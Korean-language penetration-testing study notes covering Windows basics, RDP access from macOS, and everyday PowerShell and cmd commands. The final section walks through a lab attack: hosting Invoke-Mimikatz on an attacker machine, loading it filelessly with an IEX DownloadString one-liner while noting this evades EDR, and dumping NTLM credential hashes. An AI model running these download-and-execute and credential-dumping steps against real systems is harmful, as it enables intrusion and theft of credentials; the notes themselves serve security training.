
# 1. 윈도우 개념 

1. 왜 중요한가?
	- 사실상 전세계 기업들에서 가장 많이 사용하는 운영체제 + 환경
	- AD/인프라 : Fortune 1000기업 90% 이상
	- 서버 : ADCS, SCCM, WSUS, IIS, 등의 기업용 인프라에 필수적인 서버들
	- EntraID: IAM(Identity and Access Management)
	- Azure: 클라우드 - 윈도우 기반의 서비스들
2. MacOS - 개발자/아티스트 **개인용**으로 많이 사용
3. 무엇이 문제 ?
	- 워게임 - 리눅스 중심
	- 실제 공격 - 윈도우 중심
	- 실제 인프라 - 윈도우 중심 
4. 대학, 학원 강의 - 접근 어려움 
	- 라이센스 

5. 윈도우 쉘
	- CMD
	- 파워쉘
	- 윈도우 터미널
	- CMD와 파워쉘 둘 다 사용할 줄 알아야 함
6. 닷넷 
	- .NET 윈도우 개발 플랫폼 - 런타임 + 프로그래밍 언어집합 + 라이브러리 + 개발자 툴 

## 윈도우 파워쉘 명령어

1. cmdlet (Commandlet) - 기본 명령어
	- <동사> - <명사> 구성
		- Get-Content == Content를 Get하는 명령어(== cat)
		- Set-Date == Date를 Set하는 명령어 

 2. Alias - "명령어 별명"
	 - ex) Get-Content == cat
	 - 리눅스 사용자들을 겨냥

3. 스크립트 (.ps1, .psd, .psm, 등등)
	- 직접실행
	- 스크립트를 메모리 상에 불러온 뒤 스크립트 안의 함수를 사용
		- 인-메모리 실행(In-Memory Execution)의 종류
		- "Fileless""파일리스" 악성코드 

# 2. 윈도우서버 접근 방법

> mac + 도커 + 리눅스 현재 불가능 xfreerdp
>https://github.com/FreeRDP/FreeRDP/issues/4215

## 1. 정상적인 동작 방법 (in Mac)

- 주의사항 
	- 현재 docker + mac 에서는 freerdp가 제대로 동작 하지 않음
	- 그나마 remmina 로 접속 시 영어 까지 입력이 되지만 키매핑을 따로 추가적으로 해줘야함 키매핑 방법은 찾지 못했음 
	- 따라서 아래에서는 mac 로컬에서 작업

 1. xquartz 설치
```
brew install --cask xquartz
```

2. freerdp 설치 
```
brew install freerdp
```

3. xquartz 실행
```
open -a XQuartz
```

4. xfreerdp 접속 
	- dynamic-resolution : 해상도를 자유롭게 조절하기 위함
```
xfreerdp /u:Administrator /p:'Password123!' /v:172.31.184.129 /dynamic-resolution

// 한영키
오른쪽 옵션 키 

// 복사키 > mac으로 가져올 수 있음 
ctrl+c 
```

## 2. 다양한 오류 해결 하며 정리한 내용 

- openvpn  socket 에러 
```
일반 - 설정 - 로그인항목 - 백그라운드 허용 openvpn 
```

- xfreerdp 키보드 미동작 오류 (exegol 에서 작업)
```
// xinput 설치
wget https://xorg.freedesktop.org/releases/individual/app/xinput-1.6.4.tar.xz

// 압축해제
tar -xvf xinput-1.6.4.tar.xz

// configure 로 소스코드를 컴파일하기전에 필요한 // 구성파일 설정
cd xinput-1.6.4
./configure 

// 소스코드 컴파일 
make 

// 컴파일된 결과물 설치
make install 

// xinput 사용
xinput --list 

// 상관이없는듯.. 
```

- rdesktop (exegol 에서 작업)
```
rdesktop -u Administrator -p Password123! 172.31.210.90:3389


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).
```

- remmina (exegol 에서 작업)
	- 한글 입력이 안됨.. 
```
// remmina 윈도우 창이 켜짐
remmina &

// 명령어로 접속 방법
protocol://username:encryptedpassword@host:port
// 예시 
rdp://Administrator@172.31.246.4

// scancode mapping
https://kbdlayout.info/kbdusx/virtualkeys
https://gitlab.com/Remmina/Remmina/-/merge_requests/2304
```

# 3. 윈도우 명령어 

1. help - powershell 
	- 도움말 
```
// 
Get-Help ls

// -Detailed > 더 자세하게 
Get-Help -Detailed ls  

// -Examples  > 예시 확인 (없는 경우도 있음)
Get-Help -Examples ls 

```

2. /? - windows
	- 도움말
```
dir /?
```

3. hostname
```
//  powrshell
hostname
> EC2AMAZ-3T6AG2T

// cmd 
hostname
> EC2AMAZ-3T6AG2T

//해당 EXE 실행 결과 , P바이너리
C:\windows\system32\HOSTNAME.EXE 

```

4. whoami
```
// powershell
whoami
호스트이름\계정이름

// cmd
whoami
호스트이름\계정이름
```

5. 현재경로 
```
// powershell
pwd

// cmd
cd
```

6. 경로이동 
```
//powershell
cd 
cd .. 
cd .\Administrator\

//cmd
cd 
cd .. 
cd .\Administrator\
```

7. 명령어 별명 확인 
```
//powershell
Get-Alias cd 

CommandType     Name
-----------     ----
Alias           cd -> Set-Location
```

8. systeminfo - 현재 윈도우의 전반적인 정보 확인
	- 모의해킹 시 굉장히 중요 
	- Hotfix(s)가 중요 Hotfix란 해당 윈도우의 보안이 패치 되었는지의 여부
```
//powershell
systeminfo

Host Name:                 EC2AMAZ-3T6AG2T
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA858
Original Install Date:     11/12/2023, 1:37:56 AM
System Boot Time:          1/30/2024, 8:54:47 AM
System Manufacturer:       Amazon EC2
System Model:              t3.small
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     2,010 MB
Available Physical Memory: 1,027 MB
Virtual Memory: Max Size:  3,162 MB
Virtual Memory: Available: 2,217 MB
Virtual Memory: In Use:    945 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\EC2AMAZ-3T6AG2T
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     172.31.128.1
                                 IP address(es)
                                 [01]: 172.31.230.192
                                 [02]: fe80::6cce:bda:704d:3b83
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

//cmd
systeminfo
```

9. clear - 창 청소 
```
// powershell
clear

// cmd
cls
```

10. 현재 디렉토리, 파일
```
// powershell
ls 

// cmd
dir
```

11. 추가 옵션
```
// powershell
	// 리눅스와 차이점, ls -a 등 한글자 만 오지만 윈도우는
	// 영단어가 온다.
ls -Force 

// cmd
// ls /s 등 슬래쉬가 많이 옴 
dir /s
```

12. 파일에 인자 
```
// powershell 
ls -location c:\path 

// cmd
dir /a:h 

ex) xfreerdp /u:Administrator 
cmd스러운 파라미터 파싱 방법
```

13. 숨김파일 확인
```
// powershell
ls -Force 
```

14. echo 
```
// powershell
echo "H"
> H

// test file 생성
echo "Hello" > test.txt

// cat file 확인
cat 

// cmd
	//cmd는 굳이 쌍따옴표 없어도 됨
echo "H"
> "H"

// 파일 확인 
type test.txt
```

15. >  , >>, |
```
// powershell
echo 'redraccoon' > test.txt
cat test.txt
> redraccoon

// >> (append) 기존 파일 다음줄에 추가! 
echo 'redraccoon2' >> test.txt 
>redraccoon
>redraccoon2 

// | 
// <previouscommand> | <nextcommand> 

Get-Process | Where-Object { $_.ProcessName -eq "explorer"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1492      59    25028      87328       3.08   3268   2 explorer
```

16. cat -First, cat -Last
```
// 첫 두줄만 조회
cat -First 2 .\teset.txt

// 마지막 두줄 
cat -Last 2 .\teset.txt
```

17. mv
```
// power shell
mv .\test.txt test2.txt 

// cmd
move test2.txt test3.txt 
```

18. cp
```
// power shell
mv .\test3.txt test4.txt 

// cmd
copy test4.txt test5.txt 
```

19. rm 
```
// power shell
rm .\test5.txt

// cmd 
del test4.txt
```

20. mkdir 
```
// power shell
mkdir powershell 

//cmd 
mkdir cmd
```


# 4. 파워쉘 인 - 메모리 실행 

1. 스크립트 다운 및 http server on
```
# exegol 이 아닌 mac에서 본인이 정한 폴더로 이동 후 진행 필요
# 현재 본인경로 .exegol - workspaces - bhpt 안
# 칼리 리눅스 - 스크립트 다운 후 호스팅 
wget https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1

// 실행 
python3 -m http.server 80 

//mac 의 ifconfig 확인 후 가장 하단 utun6 의 ip 확인
utun6: flags=8051<UP,POINTOPOINT,RUNNING,MULTICAST> mtu 1500
	inet 10.8.0.15 --> 10.8.0.1 netmask 0xffffff00

// 접속한 윈도우 데스크탑에서 크롬 -> ip 입력 10.8.0.15
// 그럼 설치한 파일 (Invoke-Mimikatz.ps1)이 보이고 다운로드 // 가능 
```

2. powershell 활용한 다운로드 
	- 새로운 파워쉘을 열어서 똑같이 입력한다고 동작 되지는 않음 
	- 그리고 모든 파일을 찾아봐도 해당 설치 스크립트를 찾을 수 없음 왜냐면 메모리상에 올린 것 이기 때문에 
	- 따라서 EDR이나 이런 프로그램들이 찾기가 더 어려움 
```
// 원격에 있는 파워쉘 스크립트를 메모리상으로 불러와 실행 가능 !
IEX(New-Object Net.Webclient).DownloadString('http://10.8.0.15/Invoke-Mimikatz.ps1')

// 
서버 open 한 쉘 창에서 get 한내용을 확인가능 
해당 파워 쉘에서 어떤 결과가 보이지는 않지만 적용 됨 
적용 된 내용을 확인 

Invoke-Mimikatz 해당 함수는 방금 설치한 파워쉘 스크립트에만 있는 함수 
//

Get-Help Invoke-Mimikatz  
update 는  N 

해당 함수 호출 가능 확인 
```

3. Invoke-Mimikatz -DumpCreds 
	- Invoke-Mimikatz 등 함수를 어디서 확인가능? 구글 또는 
		설치한 파일을 vim으로 열어보면 확인 가능 
	- 또는 파워쉘에서 Get-help Invoke-Mimikatz
```
// 현재 호스트에 존재한는 계정의 NT해시된 비밀번호 확인 가능 
Invoke-Mimikatz -DumpCreds 

// 결과 
Session           : RemoteInteractive from 2                                                                                       User Name         : Administrator


* Username : Administrator                                                                                                         * Domain   : EC2AMAZ-3T6AG2T                                                                                                       * NTLM     : 2b576acbe6bcfda7294d6bd18041b8fe                                                                                      * SHA1     : e30d1c18c56c027667d35734660751dc80203354                                                                              * DPAPI    : e30d1c18c56c027667d35734660751dc 

```

4. Invoke-Mimikatz 사용법
```
Get-help Invoke-Mimikatz

Get-help -Detailed Invoke-Mimikatz

Get-help -Example Invoke-Mimikatz
```